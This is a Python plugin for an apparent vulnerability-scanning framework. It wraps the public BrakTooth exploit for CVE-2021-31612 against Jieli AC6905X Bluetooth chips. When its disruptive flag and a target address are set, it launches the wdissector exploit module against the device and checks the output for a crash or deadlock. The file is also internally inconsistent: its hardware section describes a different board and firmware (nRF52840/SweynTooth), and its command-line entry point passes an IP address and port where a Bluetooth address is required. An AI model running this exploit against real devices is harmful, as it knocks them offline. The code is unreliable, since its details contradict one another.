#!/usr/bin/env python3
"""CVE-2021-31612 – BrakTooth BT Classic: LMP Auto Rate Overflow – Zhuhai Jieli AC6905X overflow.

Public PoC source: https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks
  Attack module: lmp_auto_rate_overflow
  Target chip: Zhuhai Jieli AC6905X
  (Matheus Eduardo Garbelini, ASSET SUTD, 2021)

Hardware requirements:
  - ESP32 development board flashed with BrakTooth firmware (esp32driver.zip)
  - BDTracker / WDissector framework installed
  Target MAC specified via target_bdaddr= param.

Usage:
  Load exploit module "lmp_auto_rate_overflow" via WDissector:
    sudo ./wdissector --exploit=lmp_auto_rate_overflow --target=<bdaddr>
"""
from __future__ import annotations

import shutil
import subprocess
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 88,
    "cve": "CVE-2021-31612",
    "year": 2021,
    "domain": "wireless",
    "vendor_product": "Zhuhai Jieli AC6905X Bluetooth Classic SoC",
    "component": "Bluetooth Classic LMP / HCI stack",
    "type": "BT Classic protocol attack → DoS / crash / RCE",
    "summary": "LMP Auto Rate Overflow – Zhuhai Jieli AC6905X overflow",
    "source_url": "https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks",
    "requires_manual_review": True,
    "affected": [{"vendor": "Multiple BT Classic SoC vendors",
                  "product": "Zhuhai Jieli AC6905X",
                  "versions": [{"version": "pre-2021 patch", "status": "affected"}
]}],
}

# ── 硬件需求（HW_REQUIREMENTS） ────────────────────────────────────────
HW_REQUIREMENTS = {
    "hardware":   ['nRF52840 开发板（Nordic Semiconductor PCA10056）', 'USB Type-C 数据线'],
    "connection": 'USB HCI（/dev/ttyACM0）',
    "tools":      ['wdissector >= 3.0', 'SweynTooth / BrakTooth BLE 固件'],
    "firmware":   'SweynTooth 专用固件（https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks）',
    "setup":      'sudo python3 central_bypass.py /dev/ttyACM0',
}


BRAK_REPO    = Path(__file__).parent.parent.parent /     "public_poc_sources/repos/Matheus-Garbelini__braktooth_esp32_bluetooth_classic_attacks"
WDISSECTOR   = Path("/opt/wdissector/wdissector")  # operator installs
ESP32_DRIVER = BRAK_REPO / "esp32driver.zip"


def _run_poc(plugin):
    target  = (plugin.params or {}).get("target_bdaddr", "")
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    evidence = {
        "cve": "CVE-2021-31612",
        "braktooth_module": "lmp_auto_rate_overflow",
        "target_chip": "Zhuhai Jieli AC6905X",
        "brak_repo_present": BRAK_REPO.exists(),
        "esp32driver_present": ESP32_DRIVER.exists(),
        "wdissector_present": WDISSECTOR.exists() or shutil.which("wdissector") is not None,
        "attack_surface": "Zhuhai Jieli AC6905X BT SoC LMP auto rate overflow → deadlock",
    }

    if allow_disruptive and target:
        wd_bin = str(WDISSECTOR) if WDISSECTOR.exists() else shutil.which("wdissector") or "wdissector"
        cmd = [wd_bin, f"--exploit={_module}", f"--target={target}"]
        cmd[1] = f"--exploit=lmp_auto_rate_overflow"
        evidence["command"] = " ".join(cmd)
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            evidence["rc"]     = proc.returncode
            evidence["stdout"] = proc.stdout[:600]
            evidence["stderr"] = proc.stderr[:300]
            evidence["crashed"] = ("crash" in proc.stdout.lower() or
                                    "deadlock" in proc.stdout.lower() or
                                    "reboot" in proc.stdout.lower())
        except FileNotFoundError:
            evidence["detail"] = (
                "wdissector not found. Install BrakTooth WDissector framework "
                "from https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks"
            )
        except subprocess.TimeoutExpired:
            evidence["detail"] = "Probe timed out."
        except Exception as exc:
            evidence["detail"] = str(exc)
    else:
        evidence["detail"] = (
            "Supply target_bdaddr= (target BT Classic BD address) + allow_disruptive=true. "
            "Install WDissector/BrakTooth firmware on ESP32 first."
        )

    return {
        "vulnerable": evidence.get("crashed"),
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "Matheus-Garbelini/braktooth / module: lmp_auto_rate_overflow",
    }


_module = "lmp_auto_rate_overflow"  # exploit module name
try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc110CVE202131612BrakToothBtClassicAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50_more"
    meta_display_id = "POC-WIRELESS-110"
    meta_poc_name   = 'CVE-2021-31612 BrakTooth AC6905X LMP Auto Rate Overflow Active Validation'
    meta_cve_id     = "CVE-2021-31612"
    meta_severity   = "High"
    meta_protocol   = "bluetooth"
    meta_target_os  = ["embedded"]
    meta_required_params = ["target_bdaddr"]
    meta_optional_params = ["allow_disruptive"]
    meta_profiles   = ["wireless"]
    meta_source_url = "https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks"
    meta_references       = ['https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks']
    meta_attack_surface = "Zhuhai Jieli AC6905X BT SoC LMP auto rate overflow → deadlock"
    is_disruptive   = True
    meta_destructive_level = "ServiceDisruption"

    def check_prerequisites(self):
        return bool((self.params or {}).get("target_bdaddr"))

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "110_LMP_Auto_Rate_Overflow__Zhuhai_Jieli_AC_Audit") if "VULN" in dir() else "110_LMP_Auto_Rate_Overflow__Zhuhai_Jieli_AC_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc110CVE202131612BrakToothBtClassicAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
